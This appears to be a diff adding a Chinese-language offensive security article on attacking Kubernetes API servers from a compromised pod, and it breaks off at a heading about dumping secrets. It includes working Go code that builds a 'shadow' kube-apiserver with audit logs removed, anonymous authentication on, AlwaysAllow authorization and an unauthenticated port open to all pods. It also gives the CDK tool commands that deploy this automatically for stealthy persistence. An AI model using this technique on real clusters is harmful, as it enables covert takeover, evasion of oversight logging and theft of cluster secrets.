@@ -1,0 +1,118 @@
+## Kube-apiserver
+API Server是k8s control
+panel中的一个组件，下游与etcd(k8s数据库)通信，通过kubelet控制每个节点的行为，上游暴露API供pod内部编程调用和管理员从外部通过kubectl调用。
+API Server默认支持8080免鉴权端口(已被最新k8s默认配置禁用)以及6443鉴权端口。因K8s本身的配置不当、鉴权不当导致API
+Server直接被攻破案例可参考：[《K8s 6443批量入侵调查》](https://www.cdxy.me/?p=833)。
+除此之外，一种常见的利用路径是攻击者通过业务应用（如web rce）攻入pod，在pod中寻找到高权限的service account并与API
+Server进行横向移动。
+## 手动构造kubectl请求
+某些情况下我们攻破的pod是一个缩减的容器环境，没有kubectl curl等常见命令，此时与api-server通信的方法有三种：1)植入kubectl
+2)代理流量 3)手工构造http请求与apiserver通信。
+针对pod内部无依赖直接与apiserver通信的场景，已经集成在CDK
+的tool模块中，通过`kcurl`命令与apiserver进行交互，无本地环境依赖。
+  * 
+该命令支持通过 匿名访问、通过pod内置的service account
+token鉴权访问以及通过指定token文件鉴权三种通信模式，通过手工指定url和post data向apiserver发包。
+其中关键在于，如何把kubectl的命令翻译成对apiserver通信的http包，这里提供两种方法：
+假设我们要通过kubectl apply部署一个pod，yaml如下：
+    apiVersion: v1
+    kind: Pod
+    metadata:
+      name: cdxy-test-2021
+    spec:
+      containers:
+      - image: ubuntu:latest
+        name: container
+        args:
+        - "sleep"
+        - "infinity"
+在执行kubectl时，kubectl会把这个yaml构造成json，作为http请求的data，发往指定api的url，
+这个过程可以在本地预先通过`--v=8`抓取：
+    kubectl apply -f ubuntu.yaml --v=8
+然后在攻入的pod中使用cdk kcurl重放：
+    cdk kcurl (anonymous|default|)   []
+用该方法可以快速翻译所有kubectl的操作。除此之外针对yaml转json还可以使用`kubectl create -f ubuntu.yaml
+--edit -o json` 直接生成post data。
+## Shadow API Server
+该技术由研究人员在 ["RSAC 2020: Advanced Persistence Threats: The Future of Kubernetes
+Attacks"](https://www.youtube.com/watch?v=CH7S5rE3j8w)
+提出，旨在创建一种针对K8s集群的隐蔽持续控制通道。
+该思路是创建一个具有API Server功能的Pod，后续命令通过新的"shadow api server"下发。新的api
+server创建时可以开放更大权限，并放弃采集审计日志，且不影响原有api-server功能，日志不会被原有api-server记录，从而达到隐蔽性和持久控制目的。
+执行这一思路的前提是已经拿到了master node的create pod权限，接下来主要讨论如何把这个思路工程化。
+我们先看一下master node原有的apiserver配置：
+    kubectl get pods -n kube-system | grep kube-apiserver
+    kubectl get pods -n kube-system kube-apiserver-cn-beijing.192.168.0.150 -o yaml
+在原有的apiserver配置中我们可以看到apiserver的启动参数，其中包含etcd和kubelet的通信凭据，etcd的手工连接方法参考：[《K8s渗透测试etcd的利用》](https://www.cdxy.me/?p=827)
+此外，我们要构造shadow apiserver主要关注以下几个点的配置：  
+这个pod的配置中我们只需要改动command字段让shadow spiserver获取更多权限，而保留pod原有的通信凭据和其他启动参数。
+    func generateShadowApiServerConf(json string) string {
+        json, _ = sjson.Delete(json, "status")
+        json, _ = sjson.Delete(json, "metadata.selfLink")
+        json, _ = sjson.Delete(json, "metadata.uid")
+        json, _ = sjson.Delete(json, "metadata.annotations")
+        json, _ = sjson.Delete(json, "metadata.resourceVersion")
+        json, _ = sjson.Delete(json, "metadata.creationTimestamp")
+        json, _ = sjson.Delete(json, "spec.tolerations")
+        json, _ = sjson.Set(json, "metadata.name", gjson.Get(json, "metadata.name").String()+"-shadow")
+        json, _ = sjson.Set(json, "metadata.labels.component", gjson.Get(json, "metadata.labels.component").String()+"-shadow")
+        // remove audit logs to get stealth
+        reg := regexp.MustCompile(`(")(--audit-log-[^"]*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}${3}")
+        argInsertReg := regexp.MustCompile(`(^[\s\S]*?"command"[\s\:]*?\[[^\]]*?"kube-apiserver")([^"]*?)(,\s*?"[\s\S]*?)$`)
+        // set --allow-privileged=true
+        reg = regexp.MustCompile(`("--allow-privileged\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}true${3}")
+        if !strings.Contains(json, "--allow-privileged") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--allow-privileged=true"${3}`)
+        }
+        // set insecure-port to 0.0.0.0:9443
+        reg = regexp.MustCompile(`("--insecure-port\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}9443${3}")
+        if !strings.Contains(json, "--insecure-port") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--insecure-port=9443"${3}`)
+        }
+        reg = regexp.MustCompile(`("--insecure-bind-address\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}0.0.0.0${3}")
+        if !strings.Contains(json, "--insecure-bind-address") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--insecure-bind-address=0.0.0.0"${3}`)
+        }
+        // set --secure-port to 9444
+        reg = regexp.MustCompile(`("--secure-port\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}9444${3}")
+        if !strings.Contains(json, "--secure-port") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--secure-port=9444"${3}`)
+        }
+        // set anonymous-auth to true
+        reg = regexp.MustCompile(`("--anonymous-auth\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}true${3}")
+        if !strings.Contains(json, "--anonymous-auth") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--anonymous-auth=true"${3}`)
+        }
+        // set authorization-mode=AlwaysAllow
+        reg = regexp.MustCompile(`("--authorization-mode\s*?=\s*?)(.*?)(")`)
+        json = reg.ReplaceAllString(json, "${1}AlwaysAllow${3}")
+        if !strings.Contains(json, "--authorization-mode") {
+            json = argInsertReg.ReplaceAllString(json, `${1},"--authorization-mode=AlwaysAllow"${3}`)
+        }
+        return json
+    }
+通过原有json生成新的json之后，即可部署到master node中。
+渗透过程自动化即：
+  1. 在攻入的pod内部查找API-server访问地址和凭据 
+  2. 连接apiserver判断权限 
+  3. 获取apiserver原有配置 
+  4. 修改配置 
+  5. 重新部署shadow apiserver
+以上过程已经集成到工具中，为了适应不同容器环境中没有kubectl 和 curl等命令的情况，CDK适用golang net.http原生实现了此exp。
+  * 
+## 测试流程
+首先在pod中使用cdk寻找弱点：
+    cdk evaluate
+发现当前pod内置的service account具有高权限，接下来使用exp部署shadow apiserver。
+    cdk run k8s-shadow-apiserver default
+此命令会自动完成pod搜寻->配置拉取->配置修改->部署pod的一系列操作，其中`default`参数代表执行命令的过程通过pod默认的server
+account token鉴权。
+部署成功之后，后续渗透操作全部由新的shadow apiserver代理，由于打开了无鉴权端口，任何pod均可直接向shadow
+apiserver发起请求管理集群。
+dump k8s secrets:
